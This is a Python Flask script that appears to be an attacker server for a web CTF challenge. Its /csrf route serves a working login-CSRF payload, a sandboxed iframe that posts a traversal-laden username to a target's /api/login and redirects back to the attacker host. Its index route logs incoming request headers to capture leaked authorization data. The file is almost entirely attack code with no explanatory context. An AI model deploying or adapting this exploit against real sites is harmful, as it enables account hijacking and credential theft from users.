from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
cors = CORS(app, resources={
    r"/*": {
        "origins": "*"
    }
}, allow_headers=[
    "Authorization",
    "Content-Type"
], supports_credentials=True)

@app.route("/")
def index():
    print(request.headers)
    return ""

@app.route("/csrf")
def csrf():
    return """
    <div id="exploit"></div>

    <script>
        // Init
        var host = "https://localhost:5000"
        var username = "../../logout?r=https://172.17.0.1:8000/";
        var password = "mizu";

        // Change account
        var ifr  = document.createElement("iframe");
        ifr.sandbox = "allow-scripts allow-top-navigation";
        ifr.srcdoc  = `<script>
            fetch("${host}/api/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    "username": "${username}",
                    "password": "${password}"
                }),
                credentials: "include"
            }).then(d => d.json()).then((d) => {
                top.location.href = "${host}/api/";
            })
        <\\x2Fscript>`;
        exploit.appendChild(ifr);
    </script>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, ssl_context=("cert/cert.pem", "cert/key.pem"))
